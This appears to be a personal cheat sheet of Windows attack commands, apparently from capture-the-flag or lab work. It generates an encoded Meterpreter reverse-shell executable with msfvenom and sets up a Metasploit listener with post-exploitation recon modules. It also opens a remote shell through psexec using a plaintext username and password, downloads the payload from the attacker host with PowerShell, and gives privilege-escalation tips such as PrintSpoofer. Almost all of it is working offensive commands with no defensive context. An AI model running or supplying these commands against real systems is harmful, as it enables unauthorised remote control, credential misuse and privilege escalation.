# Windows

Generate the reverse tcp client

```bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 \
    --encoder x86/shikata_ga_nai LHOST=10.9.0.21 LPORT=4446 -f exe -o hey.exe
```

Metasploit reverse tcp listener

```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 10.9.0.21
set lport 4446
exploit
run post/multi/recon/local_exploit_suggester
run post/windows/gather/enum_applications
```

Get a remote shell

```
python psexec.py gatekeeper/mayor:8CL7O1N78MdrCIsV@10.10.232.180 cmd.exe
```

download file

```powershell
powershell -Command "(New-Object Net.WebClient).DownloadFile('http://10.9.0.21:8000/hey.exe', 'hey.exe')"
powershell -Command "Invoke-WebRequest http://www.example.com/package.zip -OutFile package.zip"
```

Various tips and tricks

```
echo %username%
```

C:\Windows\Temp is often world writable

List privileges

```
whoami /priv
```

if SeImpersonate privilege enabled, try PrintSpoofer
